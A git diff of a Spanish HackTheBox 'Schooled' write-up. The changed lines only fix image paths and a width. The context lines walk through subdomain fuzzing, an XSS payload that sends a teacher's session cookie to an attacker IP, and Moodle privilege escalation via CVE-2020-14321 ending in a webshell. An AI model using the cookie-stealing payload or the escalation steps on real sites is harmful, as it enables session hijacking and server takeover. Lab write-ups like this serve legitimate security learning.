@@ -26,7 +26,7 @@ tags:
 
 <div>
 <p style = 'text-align:center;'>
-<img src="https://pic2.zhimg.com/80/v2-df2c12851f115fbf7c679f7a73fcea69_720w.jpg" alt="" width="600px">
+<img src="https://pic2.zhimg.com/80/v2-df2c12851f115fbf7c679f7a73fcea69_720w.jpg" alt="" width="250px">
 </p>
 </div>
 
@@ -116,7 +116,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 En `/teachers.html` encontramos lo que parece ser nombres de los profesores
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%202.png)
+![Untitled](/assets/images/schooled/Untitled%202.png)
 
 No encuentro nada mas interesante, asi que me pongo a buscar posibles subdominios en la web, para ello utilizo la herramienta `wfuzz` (Web Fuzzer) , y utilizando un diccionario de [SecList](https://github.com/danielmiessler/SecLists) especifico para la busqueda de subdominios y la cabecera `-H 'Host: FUZZ.schooled.htb'` para que cada una de las lineas de ese diccionario me las vaya reemplazando en la palabra FUZZ de la cabecera, de esta forma cuando la respuesta tenga un numero de caracteres distinto en este caso a 20750 `--hh 20750` me lo reporta en la consola:
 
@@ -150,7 +150,7 @@ Agregamos el subdominio encontrado al /etc/hosts
 
 Encuentro un exploit muy critico para moodle, pero necesitamos obtener privilegios de administrador:
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%203.png)
+![Untitled](/assets/images/schooled/Untitled%203.png)
 
 Puedo registrarme en esta nueva pagina y gano acceso a un moodle.
 
@@ -160,7 +160,7 @@ Moodle es una herramienta de gestión de aprendizaje, o más concretamente de Le
 
 Investigando en la pagina, entro en el curso de matematicas y el profesor ha dejado un mensaje.
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%204.png)
+![Untitled](/assets/images/schooled/Untitled%204.png)
 
 # **COOKIE HIJACKING**
 
@@ -168,7 +168,7 @@ Esto me hace pensar que podriamos realizar un Cookie Hijacking, segun el post de
 
 `<script>img = new Image(); img.src = "[http://192.168.1.44/a.php?"+document.cookie;](http://192.168.1.44/a.php?%22+document.cookie;)</script>`
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%205.png)
+![Untitled](/assets/images/schooled/Untitled%205.png)
 
 ```bash
 ❯ python3 -m http.server 80
@@ -179,11 +179,11 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 Hemos interceptado la cookie de sesion del profesor, la copiamos y pegamos en la extension de Firefox `Cookie Editor`
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%206.png)
+![Untitled](/assets/images/schooled/Untitled%206.png)
 
 Recargamos la pagina y conseguimos entrar en la cuenta del profesor
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%207.png)
+![Untitled](/assets/images/schooled/Untitled%207.png)
 
 Buscando vulnerabilidades en google, me topo con este [POST](https://www.incibe-cert.es/alerta-temprana/avisos-seguridad/multiples-vulnerabilidades-moodle-10), El cual nos dice:
 
@@ -197,35 +197,35 @@ Siguiendo los pasos:
 
 1º Añadimos al usuario manager al curso:
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%208.png)
+![Untitled](/assets/images/schooled/Untitled%208.png)
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%209.png)
+![Untitled](/assets/images/schooled/Untitled%209.png)
 
 2º Miramos el id en el perfil del profesor:
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%2010.png)
+![Untitled](/assets/images/schooled/Untitled%2010.png)
 
 3º En la peticion que hemos interceptado, cambiamos el id y el rol asignado:
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%2011.png)
+![Untitled](/assets/images/schooled/Untitled%2011.png)
 
 Hemos convertido al usuario miembro del rol manager, ahora podemos acceder como administrador.
 
 4º Clickamos en el usuario y en el perfil accedemos al panel de administrador:
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%2012.png)
+![Untitled](/assets/images/schooled/Untitled%2012.png)
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%2013.png)
+![Untitled](/assets/images/schooled/Untitled%2013.png)
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%2014.png)
+![Untitled](/assets/images/schooled/Untitled%2014.png)
 
 5º Vamos a Users → Define Roles → Manager → Edit
 
 Bajamos hasta abajo del todo y capturamos la peticion con BurpSuite de guardar:
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%2015.png)
+![Untitled](/assets/images/schooled/Untitled%2015.png)
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%2016.png)
+![Untitled](/assets/images/schooled/Untitled%2016.png)
 
 Cambiamos toda la data menos el sesskey, por la data que hay al final de este [POST](https://github.com/HoangKien1020/CVE-2020-14321) y enviamos la peticion.
 
@@ -233,11 +233,11 @@ Cambiamos toda la data menos el sesskey, por la data que hay al final de este [P
 
 Agregamos el rce.zip del [POST](https://github.com/HoangKien1020/CVE-2020-14321) y le damos a instalar
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%2017.png)
+![Untitled](/assets/images/schooled/Untitled%2017.png)
 
 Click en Continue:
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%2018.png)
+![Untitled](/assets/images/schooled/Untitled%2018.png)
 
 Y click de nuevo en Continue y en la ruta:
 
@@ -245,7 +245,7 @@ Y click de nuevo en Continue y en la ruta:
 
 Tenemos una webShell:
 
-![Untitled](Schooled%20f583836a391b4f8391dfd4d4effc776e/Untitled%2019.png)
+![Untitled](/assets/images/schooled/Untitled%2019.png)
 
 # **GANANDO ACCESO**
 
